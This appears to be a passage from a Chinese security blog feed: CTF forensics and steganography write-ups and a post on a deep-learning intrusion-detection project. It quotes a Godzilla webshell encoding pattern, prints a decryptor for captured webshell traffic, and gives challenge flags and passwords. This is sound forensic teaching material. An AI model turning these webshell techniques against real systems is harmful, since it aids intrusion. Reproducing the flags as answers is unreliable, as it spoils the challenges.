    <content type="html"><![CDATA[<p>本篇将分享 [陇剑杯 2021] “wifi” 题目的解题思路。</p><p>题目提供了三个文件：客户端流量包、服务端流量包和一个内存镜像。</p><h3 id="1-分析服务器流量，锁定哥斯拉-Webshell"><a href="#1-分析服务器流量，锁定哥斯拉-Webshell" class="headerlink" title="1. 分析服务器流量，锁定哥斯拉 Webshell"></a>1. 分析服务器流量，锁定哥斯拉 Webshell</h3><p>首先，我用 Wireshark 打开了服务端流量包，很快就注意到一个可疑的文件上传数据包。</p><p><img src="/img/screenshot-2025-07-28-164439.png" alt="发现可疑文件上传包"></p><p>为了看清里面到底是什么，我追踪了它的 HTTP 流。</p><p><img src="/img/image-20250728164601225.png" alt="追踪 HTTP 会话数据"></p><p>在会话数据中，我发现了一段经过层层编码的 Payload。这种 <code>eval(base64_decode(strrev(urldecode(...))))</code> 的结构是典型的哥斯拉 Webshell（Godzilla）的通信特征。</p><p><img src="/img/screenshot-2025-07-28-164744.png" alt="发现加密 Payload"></p><p>通过解码，我确认了这是一个哥斯拉 <code>php_eval_xor_base64</code> 变种的 Webshell。</p><p><img src="/img/image-20250728165315291.png" alt="解码后的 Webshell 源码"></p><h3 id="2-内存取证，提取-WiFi-凭据"><a href="#2-内存取证，提取-WiFi-凭据" class="headerlink" title="2. 内存取证，提取 WiFi 凭据"></a>2. 内存取证，提取 WiFi 凭据</h3><p>既然有 Webshell，那么客户端和服务器之间必定有通信。我打开客户端流量包，发现流量被 WPA2 加密了。要解密，就必须找到 WiFi 的 SSID 和密码。从流量包中，我可以轻松看到 SSID 是 “My_Wifi”。</p><p><img src="/img/image-20250728165908423.png" alt="发现 WiFi SSID"></p><p>密码去哪找呢？这时候，内存镜像文件就派上用场了。我使用 Volatility 3 来分析这个 Windows 7 的内存镜像。首先，获取系统基本信息。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">python vol.py <span class="hljs-operator">-f</span> <span class="hljs-string">&quot;Windows 7-dde00fa9.vmem&quot;</span> windows.info<br></code></pre></td></tr></table></figure><p><img src="/img/screenshot-2025-07-28-112658.png" alt="获取系统信息"></p><p>接着，我用 <code>filescan</code> 插件在内存中搜索与 “My_Wifi” 相关的文件。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$env:PYTHONIOENCODING</span> = <span class="hljs-string">&quot;utf-8&quot;</span><br>python vol.py <span class="hljs-operator">-f</span> <span class="hljs-string">&quot;Windows 7-dde00fa9.vmem&quot;</span> windows.filescan | <span class="hljs-built_in">Select-String</span> <span class="hljs-string">&quot;My_Wifi&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20250728171922516.png" alt="搜索 WiFi 相关文件"></p><p>运气不错，找到了一个 <code>My_Wifi.zip</code> 文件。我立刻使用 <code>dumpfiles</code> 将它从内存中提取出来。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">python vol.py <span class="hljs-operator">-f</span> <span class="hljs-string">&quot;Windows 7-dde00fa9.vmem&quot;</span> windows.dumpfiles <span class="hljs-literal">--physaddr</span> <span class="hljs-number">0</span>x3fdc38c8<br><span class="hljs-built_in">Rename-Item</span> <span class="hljs-string">&quot;file.0x3fdc38c8.dmp&quot;</span> <span class="hljs-string">&quot;My_Wifi.zip&quot;</span><br></code></pre></td></tr></table></figure><p>然而，解压时发现 ZIP 文件有密码，注释提示密码是 <code>Network Adapter GUID</code>。</p><p><img src="/img/screenshot-2025-07-28-112609.png" alt="ZIP 文件密码提示"></p><p>于是，我回到 Volatility，继续在内存中搜索网络接口信息，以找到这个 GUID。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">python vol.py <span class="hljs-operator">-f</span> <span class="hljs-string">&quot;Windows 7-dde00fa9.vmem&quot;</span> windows.filescan | <span class="hljs-built_in">Out-File</span> <span class="hljs-literal">-FilePath</span> filescan.txt <span class="hljs-literal">-Encoding</span> utf8<br><span class="hljs-built_in">Select-String</span> <span class="hljs-literal">-Path</span> filescan.txt <span class="hljs-string">&quot;Interfaces&quot;</span> &gt; interfaces_files.txt<br></code></pre></td></tr></table></figure><p><img src="/img/image-20250728172547439.png" alt="获取网络适配器 GUID"></p><p>成功找到了 GUID：<code>&#123;529B7D2A-05D1-4F21-A001-8F4FF817FC3A&#125;</code>。用这个 GUID 作为密码，我成功解压了 ZIP 文件，得到了 <code>无线网络连接-My_Wifi.xml</code>。</p><p>打开这个 XML 文件，WiFi 密码赫然在列。</p><p><img src="/img/image-20250728172705356.png" alt="获取 WiFi 密码"></p><p>WiFi 密码是：<code>233@114514_qwe</code></p><h3 id="3-解密流量，最终夺旗"><a href="#3-解密流量，最终夺旗" class="headerlink" title="3. 解密流量，最终夺旗"></a>3. 解密流量，最终夺旗</h3><p>拿到了密码，解密客户端流量就轻而易举了。我在 Wireshark 中配置好 WPA2 解密密钥（SSID: My_Wifi, 密码: 233@114514_qwe）。</p><p><img src="/img/screenshot-2025-07-28-152248.png" alt="配置 Wireshark 解密"></p><p>解密后，过滤 HTTP 流量，我看到了四个来自哥斯拉 Webshell 的响应包。</p><p><img src="/img/image-20250728173419607.png" alt="发现 Webshell 响应包"></p><p>追踪其中一个 HTTP 流，提取出加密的响应数据。</p><p><img src="/img/image-20250728173513471.png" alt="提取加密响应数据"></p><p>最后，使用哥斯拉的解密脚本，对这段数据进行解密，就能得到最终的 Flag。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">encode</span>(<span class="hljs-params"><span class="hljs-variable">$D</span>, <span class="hljs-variable">$K</span></span>) </span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$D</span>); <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$c</span> = <span class="hljs-variable">$K</span>[<span class="hljs-variable">$i</span> + <span class="hljs-number">1</span> &amp; <span class="hljs-number">15</span>];<br>        <span class="hljs-variable">$D</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$D</span>[<span class="hljs-variable">$i</span>] ^ <span class="hljs-variable">$c</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$D</span>;<br>&#125;<br><br><span class="hljs-variable">$key</span> = <span class="hljs-string">&#x27;3c6e0b8a9c15224a&#x27;</span>;<br><span class="hljs-variable">$key1</span> = <span class="hljs-string">&quot;72a9c691ccdaab98fL1tMGI4YTljMn75e3jOBS5/V31Qd1NxKQMCe3h4KwFQfVAEVworCi0FfgB+BlWZhjRlQuTIIB5jMTU=b4c4e1f6ddd2a488&quot;</span>;<br><span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$key1</span>, <span class="hljs-number">16</span>, -<span class="hljs-number">16</span>);  <span class="hljs-comment">// 去除前后各16位字符</span><br><span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">gzdecode</span>(<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$str</span>), <span class="hljs-variable">$key</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$str</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>运行脚本，成功输出 Flag：<code>flag&#123;5db5b7b0bb74babb66e1522f3a6b1b12&#125;</code>。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这个题目综合考察了流量分析和内存取证技术，从发现 Webshell 到解密 WiFi 流量，再到最后从 C2 响应中解出 Flag，环环相扣，是一道质量很高的 CTF 赛题。</p>]]></content>
    
    
    <categories>
      
      <category>CTF竞赛</category>
      
      <category>MISC</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WriteUp</tag>
      
      <tag>流量分析</tag>
      
      <tag>陇剑杯</tag>
      
      <tag>内存取证</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>基于深度学习的流量检测和响应系统</title>
    <link href="/2025/08/16/%E5%9F%BA%E4%BA%8E%E6%89%A9%E6%95%A3%E6%A8%A1%E5%9E%8B%E7%9A%84%E6%B5%81%E9%87%8F%E6%A3%80%E6%B5%8B%E5%92%8C%E5%93%8D%E5%BA%94%E7%B3%BB%E7%BB%9F/"/>
    <url>/2025/08/16/%E5%9F%BA%E4%BA%8E%E6%89%A9%E6%95%A3%E6%A8%A1%E5%9E%8B%E7%9A%84%E6%B5%81%E9%87%8F%E6%A3%80%E6%B5%8B%E5%92%8C%E5%93%8D%E5%BA%94%E7%B3%BB%E7%BB%9F/</url>
    
    <content type="html"><![CDATA[<h2 id="📋-项目概述"><a href="#📋-项目概述" class="headerlink" title="📋 项目概述"></a>📋 项目概述</h2><p>系统是一个端到端的SOAR（安全编排、自动化与响应）平台，核心采用扩散概率模型作为检测引擎，结合事件驱动微服务架构和可视化工具。整体分为五层结构，包括流量采集与预处理、深度异常检测引擎、SOAR核心控制层、溯源分析与攻击链重建层，以及响应剧本与配置管理。通过Kafka事件总线串联各模块，实现松耦合和高扩展性。</p><span id="more"></span><h2 id="🎯-项目背景"><a href="#🎯-项目背景" class="headerlink" title="🎯 项目背景"></a>🎯 项目背景</h2><p>在网络安全领域，随着威胁的复杂化，我们开发了一个创新的基于扩散模型的网络安全自动化响应系统。该系统聚焦于精准检测、快速响应和可解释溯源，构建从流量采集到自动处置的闭环防护链，帮助企业提升防御效率。</p><h2 id="🏗️-系统架构"><a href="#🏗️-系统架构" class="headerlink" title="🏗️ 系统架构"></a>🏗️ 系统架构</h2><h3 id="整体架构"><a href="#整体架构" class="headerlink" title="整体架构"></a>整体架构</h3><p>系统围绕”检测、分类、响应、溯源”四大目标，构建了一个事件驱动的微服务架构：采集—解析—推理—响应。核心检测器基于改进的扩散模型（DDPM&#x2F;DDIM），结合多分类输出结构和时间嵌入（如TimesNet&#x2F;SCConv），对长短期流量序列进行精细化编码。在训练阶段，仅需标签监督，不依赖异常样本的规则建模。检测结果触发YAML剧本响应，如自动封禁IP或隔离主机，并通过攻击链可视化提升可解释性。平均威胁响应时间（MTTR）压缩至3-4秒。</p><p><img src="/img/image-20250816154811271.png" alt="系统架构图"></p><h3 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h3><h4 id="扩散模型基本原理"><a href="#扩散模型基本原理" class="headerlink" title="扩散模型基本原理"></a>扩散模型基本原理</h4><p>扩散模型通过正向过程逐步添加高斯噪声，使数据趋于纯噪声分布；逆向过程则训练模型去噪重建原始数据。在本系统中，我们将其应用于结构化网络流量：以会话级样本为基础，正向添加噪声，逆向预测噪声成分。同时嵌入分类分支，实现重建与判别的双重目标。</p><h4 id="模型结构设计与模块划分"><a href="#模型结构设计与模块划分" class="headerlink" title="模型结构设计与模块划分"></a>模型结构设计与模块划分</h4><p>采用带分类器头的UNet-DDPM架构：</p><ul><li><strong>特征编码器</strong>：处理80+维流量特征（如包间隔、协议类型）。</li><li><strong>U-Net主干</strong>：多尺度残差块、自注意力机制，执行噪声预测。</li><li><strong>分类器头</strong>：输出九类概率向量（正常+八种攻击）。</li><li><strong>时间嵌入</strong>：引导不同扩散阶段的学习。</li><li><strong>额外模块</strong>：DropPath和Attention，提升深度和跨维度关联。</li></ul><p><img src="/img/image-20250816155010520.png" alt="模型结构图"></p><h4 id="训练策略与损失函数构建"><a href="#训练策略与损失函数构建" class="headerlink" title="训练策略与损失函数构建"></a>训练策略与损失函数构建</h4><p>联合优化重建损失（MSE，衡量噪声预测误差）和分类损失（交叉熵）。整体损失为加权组合：L &#x3D; λ1 * L_recon + λ2 * L_class。适当提高分类权重，提升小类攻击识别。使用SMOTE过采样缓解不平衡，训练在CICIDS2017数据集上进行，AUC从0.65逐步升至0.95，Loss稳定下降。</p><p><img src="/img/image-20250816154942865.png" alt="训练曲线"></p><h4 id="推理机制与多分类判决"><a href="#推理机制与多分类判决" class="headerlink" title="推理机制与多分类判决"></a>推理机制与多分类判决</h4><p>新流量进入后：提取特征向量→执行扩散重建→输出标签、置信度和特征重要性。若为攻击，则触发响应。DDIM加速确保实时性，单GPU吞吐达8000 Flow&#x2F;s。</p><h3 id="软件流程与系统逻辑"><a href="#软件流程与系统逻辑" class="headerlink" title="软件流程与系统逻辑"></a>软件流程与系统逻辑</h3><h4 id="整体软件工作流程"><a href="#整体软件工作流程" class="headerlink" title="整体软件工作流程"></a>整体软件工作流程</h4><ol><li><strong>数据接入</strong>：实时抓包或导入数据集，写入Kafka pcap_topic。</li><li><strong>预处理</strong>：CICFlowMeter解析80+特征，发布至flow_topic。</li><li><strong>模型推理</strong>：订阅flow_topic，调用UNetFC-DDPM，输出写入alert_topic。</li><li><strong>分类与记录</strong>：保存标签、置信度、Grad-CAM&#x2F;Shap值特征重要性。</li><li><strong>安全联动</strong>：匹配YAML剧本，执行防火墙&#x2F;EDR动作，支持回滚。</li><li><strong>可视化</strong>：WebSocket实时刷新告警、攻击链图和报告。</li></ol><h4 id="异步多线程执行机制"><a href="#异步多线程执行机制" class="headerlink" title="异步多线程执行机制"></a>异步多线程执行机制</h4><p>采用线程池：采集线程存入队列，处理线程标准化，推理线程批量处理，响应线程下发命令，前端线程更新界面。确保高并发和稳定性。</p><h3 id="系统功能设计"><a href="#系统功能设计" class="headerlink" title="系统功能设计"></a>系统功能设计</h3><ul><li><p><strong>态势感知</strong>：仪表盘显示安全评分、资源监控和流量趋势。</p><p><img src="/img/image-20250816155052522.png" alt="态势感知仪表盘"></p></li><li><p><strong>告警管理</strong>：展示攻击类型、风险等级，支持状态分类和筛选。</p><p><img src="/img/image-20250816155111493.png" alt="告警管理界面"></p></li><li><p><strong>自动响应</strong>：内置剧本库，支持自定义规则和多级告警。</p><p><img src="/img/image-20250816155120319.png" alt="自动响应配置"></p></li><li><p><strong>可视化分析</strong>：攻击链图、时间线、Shapley值解释。</p><p><img src="/img/image-20250816155133683.png" alt="可视化分析"></p><p><strong>实时检测</strong>：对主机流量进行实时检测，发现威胁。</p></li></ul><p>![实时检测](&#x2F;img&#x2F;屏幕截图 2025-07-02 110747-1758258802844-1.png)</p><ul><li><p><strong>日志审计</strong>：记录操作日志，支持查询和导出。</p><p><img src="/img/image-20250816155147444.png" alt="日志审计"></p></li><li><p><strong>模型管理</strong>：参数配置、版本切换和状态监控。</p></li><li><p><strong>后端推理</strong>：高并发处理，支持每日数十万条连接。</p></li></ul><h3 id="性能指标与评估"><a href="#性能指标与评估" class="headerlink" title="性能指标与评估"></a>性能指标与评估</h3><p>在CICIDS2017数据集上，九类性能如下：</p><table><thead><tr><th>类别</th><th>精确率</th><th>召回率</th><th>F1分数</th><th>准确率</th></tr></thead><tbody><tr><td>Benign</td><td>0.981</td><td>0.964</td><td>0.980</td><td>0.972</td></tr><tr><td>DDoS</td><td>0.980</td><td>0.952</td><td>0.979</td><td>0.966</td></tr><tr><td>DoS</td><td>0.959</td><td>0.934</td><td>0.957</td><td>0.946</td></tr><tr><td>PortScan</td><td>0.963</td><td>0.934</td><td>0.961</td><td>0.948</td></tr><tr><td>Bot</td><td>0.951</td><td>0.924</td><td>0.949</td><td>0.938</td></tr><tr><td>Brute Force</td><td>0.939</td><td>0.925</td><td>0.938</td><td>0.932</td></tr><tr><td>Web</td><td>0.925</td><td>0.904</td><td>0.923</td><td>0.914</td></tr><tr><td>Heartbleed</td><td>0.910</td><td>0.900</td><td>0.909</td><td>0.905</td></tr><tr><td>Infiltration</td><td>0.914</td><td>0.901</td><td>0.913</td><td>0.908</td></tr></tbody></table><p>平均F1&#x3D;0.948。推理延时2.8ms，吞吐4万条&#x2F;秒。与CNN-1D对比，F1提升2.6%，准确率提升2.5%。</p><h2 id="创新说明"><a href="#创新说明" class="headerlink" title="创新说明"></a>创新说明</h2><p>本系统在多个方面实现了技术突破：</p><ol><li><strong>扩散模型在流量检测的首创应用</strong>：传统模型对小样本攻击（如Heartbleed，原始仅11条）识别差。我们通过噪声引导和去噪过程，提升稀有类别学习，F1&gt;0.90，优于CNN和Tree-based方法。</li><li><strong>噪声增强数据管道</strong>：设计可控噪声注入生成”伪异常”样本，结合多任务损失，提升边界样本鲁棒性。小类召回率提升6.4%。</li><li><strong>训练-测试一体化可视化</strong>：集成Loss&#x2F;AUC曲线、ROC&#x2F;PR图、混淆矩阵，支持实时调优。</li><li><strong>多模型对比框架</strong>：横向评估CNN-1D、LSTM、Random Forest、XGBoost，验证扩散模型优势（Precision 0.953 vs. CNN的0.927）。</li><li><strong>SOAR与微服务深度融合</strong>：Kafka驱动检测到处置闭环，解决”垃圾进垃圾出”问题。MTTR缩短至3-4秒，支持插件化扩展。</li></ol><p>这些创新不仅提升了检测精度和响应效率，还增强了系统的可解释性和实用性，为网络安全提供了新范式。</p><h2 id="💡-总结与心得"><a href="#💡-总结与心得" class="headerlink" title="💡 总结与心得"></a>💡 总结与心得</h2><p>这个项目前前后后花了两个月的时间，从算法设计到模型训练，再到最后的前后端设计都依赖ai编程，但同时对深度学习项目有了一个全新的理解，希望下次在有算法支撑或者理论基础的情况下开发一个更实用的系统。</p>]]></content>
    
    
    <categories>
      
      <category>安全项目</category>
      
    </categories>
    
    
    <tags>
      
      <tag>深度学习</tag>
      
      <tag>安全工具</tag>
      
      <tag>开发实践</tag>
      
      <tag>项目分享</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[SCTF 2021]in_the_vaporwaves</title>
    <link href="/2025/08/08/CTF%E7%AB%9E%E8%B5%9B/MISC/%5BSCTF%202021%5Din_the_vaporwaves/"/>
    <url>/2025/08/08/CTF%E7%AB%9E%E8%B5%9B/MISC/%5BSCTF%202021%5Din_the_vaporwaves/</url>
    
    <content type="html"><![CDATA[<p>本篇将分享一道关于音频隐写的 CTF 题目解题思路，核心在于利用 Audacity 分析并处理反相声道，最终解码隐藏在其中的摩尔斯电码。</p><h3 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h3><h4 id="1-音频初步分析"><a href="#1-音频初步分析" class="headerlink" title="1. 音频初步分析"></a>1. 音频初步分析</h4><p>首先，在 Audacity 中打开音频文件 <code>c.wav</code>。通过观察波形，可以发现左右声道呈现明显的反相特征，这是音频隐写中藏匿信息的常用手段。</p><p><img src="/img/screenshot-wps5.jpg" alt="Audacity 打开 c.wav 文件"></p><h4 id="2-声道处理与信息提取"><a href="#2-声道处理与信息提取" class="headerlink" title="2. 声道处理与信息提取"></a>2. 声道处理与信息提取</h4><p>为了提取隐藏信号，需要将立体声轨道分离为两个独立的单声道。在轨道控制面板中选择“分离立体声轨到单声道”。</p><p><img src="/img/screenshot-wps6.jpg" alt="分离立体声轨到单声道"></p><p>分离后，全选两个单声道轨道，并执行“混音并渲染到新轨道”。由于原始声道是反相的，音频信号会相互抵消，而隐藏的同相信号（摩尔斯电码）则会因叠加而增强。</p><p><img src="/img/screenshot-wps7.jpg" alt="混音并渲染"></p><h4 id="3-摩尔斯电码解码"><a href="#3-摩尔斯电码解码" class="headerlink" title="3. 摩尔斯电码解码"></a>3. 摩尔斯电码解码</h4><p>混音后，新轨道上会清晰地显现出摩尔斯电码的波形。</p><p><img src="/img/screenshot-wps8.jpg" alt="混音并渲染后的结果"></p><p>根据波形的长短（点和划），记录下摩尔斯电码：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">...</span> -<span class="hljs-string">.-.</span> - <span class="hljs-string">..-.</span> -<span class="hljs-string">..</span> . <span class="hljs-string">...</span> <span class="hljs-string">.----</span> <span class="hljs-string">.-.</span> <span class="hljs-string">...--</span> <span class="hljs-string">..--.-</span> -<span class="hljs-string">..</span> <span class="hljs-string">.-.</span> <span class="hljs-string">..</span> <span class="hljs-string">...-</span> . <span class="hljs-string">...</span> <span class="hljs-string">..--.-</span> <span class="hljs-string">..</span> -. - <span class="hljs-params">-----</span> <span class="hljs-string">..--.-</span> <span class="hljs-string">...-</span> <span class="hljs-string">.-</span> <span class="hljs-string">.--.</span> <span class="hljs-params">---</span> <span class="hljs-string">.-.</span> <span class="hljs-string">.--</span> <span class="hljs-string">.--.-.</span> <span class="hljs-string">...-</span> . <span class="hljs-string">...</span><br></code></pre></td></tr></table></figure><p>使用解码工具或参照摩尔斯电码表进行翻译，即可获得最终的 Flag。</p><p><strong>Flag</strong>: <code>SCTFDES1R3_DRIVES_INT0_VAPORW@VES</code></p>]]></content>
    
    
    <categories>
      
      <category>CTF竞赛</category>
      
      <category>MISC</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WriteUp</tag>
      
      <tag>音频隐写</tag>
      
      <tag>Audacity</tag>
      
      <tag>摩尔斯电码</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[2019RoarCTF]黄金六年</title>
    <link href="/2025/08/08/CTF%E7%AB%9E%E8%B5%9B/MISC/%5B2019RoarCTF%5D%E9%BB%84%E9%87%91%E5%85%AD%E5%B9%B4/"/>
    <url>/2025/08/08/CTF%E7%AB%9E%E8%B5%9B/MISC/%5B2019RoarCTF%5D%E9%BB%84%E9%87%91%E5%85%AD%E5%B9%B4/</url>
    
    <content type="html"><![CDATA[<p>本篇将分享一道关于视频隐写的 CTF 题目解题思路，涉及视频拆帧、二维码识别、Base64 解码和压缩包破解。</p><h3 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h3><h4 id="1-拆解视频帧，提取二维码"><a href="#1-拆解视频帧，提取二维码" class="headerlink" title="1. 拆解视频帧，提取二维码"></a>1. 拆解视频帧，提取二维码</h4><p>首先，使用 <code>ffmpeg</code> 将视频 <code>atta.mp4</code> 拆分为静态图像序列，以便分析每一帧的内容。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ffmpeg -i atta.mp4 -r 60 %d.bmp<br></code></pre></td></tr></table></figure><p><img src="/img/screenshot-2025-07-23-145642.png" alt="视频拆帧"></p><p>遍历所有生成的图像，发现其中四张包含二维码。</p><p><img src="/img/screenshot-20250723165211688.png" alt="包含二维码的图像"></p><p>扫描这些二维码，得到四段密钥：<code>i</code>、<code>want</code>、<code>play</code>、<code>ctf</code>。将它们拼接成一个完整的字符串：<code>iwantplayctf</code>。</p><h4 id="2-提取并解码-Base64-数据"><a href="#2-提取并解码-Base64-数据" class="headerlink" title="2. 提取并解码 Base64 数据"></a>2. 提取并解码 Base64 数据</h4><p>使用十六进制编辑器检查 <code>atta.mp4</code> 文件，发现文件末尾附加了一段 Base64 编码的字符串。</p><p><img src="/img/screenshot-2025-07-23-154633.png" alt="文件尾部的 Base64 字符串"></p><p>对该字符串进行 Base64 解码，可以发现其内容为一个 RAR 压缩包。</p><p><img src="/img/screenshot-20250723165936595.png" alt="解码后的压缩包内容"></p><p>使用 Python 脚本将解码后的数据流保存为 <code>decoded_file.rar</code> 文件。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br>data = <span class="hljs-string">&#x27;&#x27;&#x27;UmFyIRoHAQAzkrXlCgEFBgAFAQGAgADh7ek5VQIDPLAABKEAIEvsUpGAAwAIZmxhZy50eHQwAQAD</span><br><span class="hljs-string">Dx43HyOdLMGWfCE9WEsBZprAJQoBSVlWkJNS9TP5du2kyJ275JzsNo29BnSZCgMC3h+UFV9p1QEf</span><br><span class="hljs-string">JkBPPR6MrYwXmsMCMz67DN/k5u1NYw9ga53a83/B/t2G9FkG/IITuR+9gIvr/LEdd1ZRAwUEAA==&#x27;&#x27;&#x27;</span><br>decoded_data = base64.b64decode(data)<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;decoded_file.rar&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(decoded_data)<br></code></pre></td></tr></table></figure><h4 id="3-解压文件，获取-Flag"><a href="#3-解压文件，获取-Flag" class="headerlink" title="3. 解压文件，获取 Flag"></a>3. 解压文件，获取 Flag</h4><p>使用第一步拼接的密钥 <code>iwantplayctf</code> 作为密码，解压 <code>decoded_file.rar</code> 文件。</p><p><img src="/img/screenshot-2025-07-23-160845.png" alt="解压文件"></p><p>成功解压后，打开 <code>flag.txt</code> 文件，即可获得最终的 Flag。</p><p><strong>Flag</strong>: <code>roarctf&#123;CTF-from-RuMen-to-RuYuan&#125;</code></p>]]></content>
    
    
    <categories>
      
      <category>CTF竞赛</category>
      
      <category>MISC</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WriteUp</tag>
      
      <tag>视频隐写</tag>
      
      <tag>FFmpeg</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[INSHack2019]Passthru</title>
    <link href="/2025/08/08/CTF%E7%AB%9E%E8%B5%9B/MISC/%5BINSHack2019%5DPassthru/"/>
    <url>/2025/08/08/CTF%E7%AB%9E%E8%B5%9B/MISC/%5BINSHack2019%5DPassthru/</url>
    
    <content type="html"><![CDATA[<p>本篇将分享一道关于 WEB 流量分析的 CTF 题目解题思路，核心在于解密 TLS 流量并从请求中提取关键参数。</p><h3 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h3><h4 id="1-加载流量包与配置解密"><a href="#1-加载流量包与配置解密" class="headerlink" title="1. 加载流量包与配置解密"></a>1. 加载流量包与配置解密</h4><p>首先，在 Wireshark 中导入题目附件 <code>passthru.pcap</code>。流量记录显示为 TLSv1.2 协议，表明通信内容已被加密。</p><p><img src="/img/screenshot-20250724110037966.png" alt="加密的 TLS 流量"></p><p>为了解密流量，需要配置 TLS 解密密钥。导航至 <strong>Edit &gt; Preferences &gt; Protocols &gt; TLS</strong>，并在 <strong>(Pre)-Master-Secret log filename</strong> 字段导入 <code>sslkey.log</code> 文件。</p><p><img src="/img/screenshot-2025-07-24-103245.png" alt="配置 TLS 解密密钥"></p><p>配置完成后，Wireshark 会自动解密 TLS 流量，还原为 HTTP 协议，便于后续分析。</p><h4 id="2-过滤并提取参数"><a href="#2-过滤并提取参数" class="headerlink" title="2. 过滤并提取参数"></a>2. 过滤并提取参数</h4><p>在显示过滤器中输入 <code>http.request.method == &quot;GET&quot;</code>，筛选所有 HTTP GET 请求。观察发现，请求的 URL 中包含一个名为 <code>kcahsni</code> 的参数。<code>kcahsni</code> 是 <code>inshack</code> 的逆序，这提示我们需要提取所有 <code>kcahsni</code> 参数的值并进行逆序处理。</p><p><img src="/img/screenshot-2025-07-24-103258.png" alt="发现 kcahsni 参数"></p><p>为了高效提取所有请求中的 <code>kcahsni</code> 参数，可使用 <code>tshark</code> 命令行工具。执行以下命令，将所有参数值批量提取到 <code>query.txt</code> 文件中：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tshark -r passthru.pcap -o tls.keylog_file:sslkey.log -T fields -e http.request.uri.query.parameter -Y <span class="hljs-string">&quot;http.request.uri.query.parameter contains \&quot;kcahsni\&quot;&quot;</span> &gt; query.txt<br></code></pre></td></tr></table></figure><p><img src="/img/screenshot-2025-07-24-103354.png" alt="提取的参数值"></p><h4 id="3-拼接并反转-Flag"><a href="#3-拼接并反转-Flag" class="headerlink" title="3. 拼接并反转 Flag"></a>3. 拼接并反转 Flag</h4><p><code>query.txt</code> 中的数据经过 URL 编码，需要解码、拼接和逆序。使用以下 Python 脚本处理：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> unquote<br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;query.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    data = unquote(f.read())<br>    rlist = re.findall(<span class="hljs-string">r&#x27;kcahsni=(.*?),&#x27;</span>, data)<br>    result = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&#x27;&#x27;</span>.join(rlist))[::-<span class="hljs-number">1</span>]<br>    <span class="hljs-built_in">print</span>(result.decode())<br></code></pre></td></tr></table></figure><p>运行脚本，即可得到最终的 Flag。</p><p><img src="/img/screenshot-2025-07-24-103816.png" 